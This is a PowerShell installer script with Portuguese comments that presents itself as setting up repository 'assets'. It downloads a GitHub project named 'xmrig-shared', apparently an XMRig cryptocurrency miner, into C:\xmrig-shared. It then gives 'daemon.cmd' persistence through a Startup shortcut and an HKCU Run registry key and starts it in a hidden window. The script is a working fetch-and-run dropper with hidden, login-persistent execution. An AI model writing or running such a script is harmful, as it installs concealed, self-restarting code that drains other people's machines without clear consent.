<#
  setup.ps1 — instala e configura assets do repositório em C:\xmrig-shared

  O que faz:
  - baixa o ZIP do branch main do repositório
  - extrai e copia a pasta `assets` para C:\xmrig-shared\assets
  - cria um atalho na pasta Startup do usuário para `assets\daemon.cmd`
  - cria/atualiza uma entrada em HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    para iniciar `assets\daemon.cmd` no login do usuário
  - executa `assets\daemon.cmd` uma vez no final

  Observações:
  - Execute em PowerShell com privilégios de usuário; se arquivos exigir
    drivers/instalação elevadas, execute como Administrador.
  - Repositório: https://github.com/5q0r/xmrig-shared
#>

[CmdletBinding()]
param()

function Write-Info($m) { Write-Host "[INFO] $m" }
function Write-Warn($m) { Write-Warning "[WARN] $m" }

# Logging helper (append to log file and show)
function Log-Write($level, $msg) {
    try {
        $ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
        $line = "{0} [{1}] {2}" -f $ts, $level, $msg
        if ($Global:LogFile) { Add-Content -Path $Global:LogFile -Value $line -ErrorAction SilentlyContinue }
        switch ($level) {
            'ERROR' { Write-Error $msg }
            'WARN'  { Write-Warn $msg }
            default { Write-Host $line }
        }
    } catch {
        Write-Host "[LOG-ERROR] $_"
    }
}

try {
    $RepoUrl = 'https://github.com/5q0r/xmrig-shared'
    $ZipUrl = "$RepoUrl/archive/refs/heads/main.zip"
    $TempZip = Join-Path $env:TEMP 'xmrig-shared.zip'
    $TempExtract = Join-Path $env:TEMP 'xmrig-shared-extract'
    $Destino = 'C:\xmrig-shared'
    $Startup = [Environment]::GetFolderPath('Startup')
    $ShortcutPath = Join-Path $Startup 'xmrig-shared-daemon.lnk'
    $RunName = 'xmrig-shared-daemon'

    # Ensure destination exists and log file path
    if (-not (Test-Path $Destino)) {
        New-Item -Path $Destino -ItemType Directory | Out-Null
    }
    $Global:LogFile = Join-Path $Destino 'setup.log'
    Log-Write 'INFO' "Script started. Destination: $Destino"
    Log-Write 'INFO' "User: $($env:USERNAME); Computer: $($env:COMPUTERNAME); PSVersion: $($PSVersionTable.PSVersion)"

    Log-Write 'INFO' 'Baixando o repositório (branch main)...'
    Invoke-WebRequest -Uri $ZipUrl -OutFile $TempZip -UseBasicParsing -ErrorAction Stop
    Log-Write 'INFO' "ZIP salvo em: $TempZip"

    if (Test-Path $TempExtract) { Remove-Item -Recurse -Force $TempExtract }
    Log-Write 'INFO' "Extraindo ZIP para: $TempExtract"
    Expand-Archive -Path $TempZip -DestinationPath $TempExtract -Force
    Remove-Item $TempZip -Force
    Log-Write 'INFO' 'Extração concluída.'

    $pastaExtraida = Get-ChildItem -Path $TempExtract | Where-Object { $_.PSIsContainer } | Select-Object -First 1
    if (-not $pastaExtraida) { throw 'Não foi possível localizar a pasta extraída do repositório.' }
    $sourcePath = $pastaExtraida.FullName
    Log-Write 'INFO' "Pasta extraída identificada: $sourcePath"

    # Copiar conteúdo de assets para o diretório raiz de destino (não criar subpasta 'assets')
    $sourceAssets = Join-Path $sourcePath 'assets'
    if (Test-Path $sourceAssets) {
        Log-Write 'INFO' "Copiando conteúdos de $sourceAssets para $Destino ..."
        # Copia todos os itens dentro de assets para o destino (arquivos e pastas)
        Copy-Item -Path (Join-Path $sourceAssets '*') -Destination $Destino -Recurse -Force
        Log-Write 'INFO' 'Cópia de assets concluída.'
    } else {
        Log-Write 'WARN' 'Pasta assets não encontrada no repositório.'
    }

    # Copiar arquivos úteis (README, LICENSE) se existirem
    foreach ($f in @('README.md','LICENSE')) {
        $s = Join-Path $sourcePath $f
        if (Test-Path $s) { Copy-Item -Path $s -Destination $Destino -Force; Log-Write 'INFO' "Copiado: $f" }
    }

    # Limpeza
    Remove-Item -Recurse -Force $TempExtract
    Log-Write 'INFO' 'Limpeza de arquivos temporários concluída.'

    # Preparar atalho de inicialização e registro Run para daemon
    $daemonPath = Join-Path $Destino 'assets\daemon.cmd'
    if (Test-Path $daemonPath) {
        Log-Write 'INFO' "Criando atalho na pasta Startup: $ShortcutPath"
        $wsh = New-Object -ComObject WScript.Shell
        $shortcut = $wsh.CreateShortcut($ShortcutPath)
        $shortcut.TargetPath = $daemonPath
        $shortcut.WorkingDirectory = Split-Path $daemonPath -Parent
        $shortcut.IconLocation = $daemonPath
        $shortcut.Save()

        Log-Write 'INFO' 'Criando/atualizando entrada HKCU Run para iniciar o daemon no login...'
        $regValue = '"' + $daemonPath + '"'
        Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $RunName -Value $regValue

        Log-Write 'INFO' 'Executando daemon uma vez (background)...'
        Start-Process -FilePath $daemonPath -WindowStyle Hidden
        Log-Write 'INFO' 'Daemon iniciado (execução única).'
    } else {
        Log-Write 'WARN' "$daemonPath não encontrado — pular criação de atalho/registro."
    }

    Log-Write 'INFO' 'Setup concluído.'
    exit 0

} catch {
    Log-Write 'ERROR' "Erro durante o setup: $_"
    exit 1
}